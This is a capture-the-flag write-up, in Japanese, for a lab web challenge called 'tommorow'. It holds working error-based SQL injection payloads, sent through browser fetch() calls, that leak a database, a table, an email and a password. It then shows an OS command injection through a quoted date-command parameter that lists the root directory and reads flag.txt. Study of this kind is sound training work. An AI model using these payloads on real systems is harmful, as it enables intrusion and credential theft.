# Writeup - tommorow

## SQLiパート
1. 対象環境にアクセスしログイン画面を開きます。 `/login`

2. SQLinjectionの脆弱性があるのでError basedのテクニックを使用してDBから情報を流出させる
- まずはDatabaseを漏洩させる為に、下記コードをブラウザのDevtoolsから実行する
```javascript
(async () => {
    const payload = `email='+AND+EXTRACTVALUE(1,+CONCAT(0x5c,+(DATABASE())))--+-`;

    const res = fetch(`/login`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: payload
    });

    const leak = await (await res).text();
    console.log(leak);
})();
```
すると、`SQL Error: Error: XPATH syntax error: '\rwpl'`が得られるので`rwpl`がDatabase名と分かる

- 次にTableを漏洩させる為に、下記コードをブラウザのDevtoolsから実行する
```javascript
(async () => {
    const payload = `email='+AND+EXTRACTVALUE(1,+CONCAT(0x5c,+(SELECT+table_name+FROM+information_schema.tables+where+table_schema+IN+('rwpl'))))--+-`;

    const res = fetch(`/login`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: payload
    });

    const leak = await (await res).text();
    console.log(leak);
})();
```
すると、`SQL Error: Error: XPATH syntax error: '\users'`が得られるので`users`がtable名と分かる

- 上記と同様にusersのカラムをleakさせるか、HTML上からguessして`email`と`password`のデータを漏洩させる
```javascript
(async () => {
    const payload = `email='+AND+EXTRACTVALUE(1,+CONCAT(0x5c,+(SELECT+email+FROM+users)))--+-`;

    const res = fetch(`/login`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: payload
    });

    const leak = await (await res).text();
    console.log(leak);
})();
```
結果: `SQL Error: Error: XPATH syntax error: '\rwpl@tommorow.example.com'`  
email: `rwpl@tommorow.example.com`

```javascript
(async () => {
    const payload = `email='+AND+EXTRACTVALUE(1,+CONCAT(0x5c,+(SELECT+password+FROM+users)))--+-`;

    const res = fetch(`/login`, {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: payload
    });

    const leak = await (await res).text();
    console.log(leak);
})();
```
結果: `SQL Error: Error: XPATH syntax error: '\sUp3r_Str0ng_RWPL_P@ssw0rd'`  
password: `sUp3r_Str0ng_RWPL_P@ssw0rd`

3. これで認証に必要な情報が揃ったので `/login` よりログインします。
```
email:rwpl@tommorow.example.com
password:sUp3r_Str0ng_RWPL_P@ssw0rd
```

## OSCiパート
1. ログインに成功したら、明日の日付ページを開きます。 `/tommorow?day=1`

2. とりあえず、`/tommorow?day=1'`へアクセスすると下記テキストが表示されます。
```
1'日後はCommand failed: date '+%Y-%m-%d' -d '1' day'
/bin/sh: syntax error: unterminated quoted string
ですね ;)
```
この結果より、`date '+%Y-%m-%d' -d '{input} day'` というコマンドが作られていることが分かります。

3. シングルクォーテーションを閉じる形でリクエストを投げるとOS Command Injectionが成立します。  
下記はOSCiが成立する一例でlsコマンドを使用しています。  
`/tommorow?day=%27;ls%20/||%27` へアクセス
```
';ls /||'日後は2025-02-27
app
bin
dev
etc
flag.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
ですね ;)
```

4. flag.txtが見つかったので確認します。  
`/tommorow?day=%27;cat%20/flag.txt||%27` へアクセス
```
';cat /flag.txt||'日後は2025-02-27
RWPL{1NJ3CT10N_M4ST3R_RWPL}ですね ;)
```
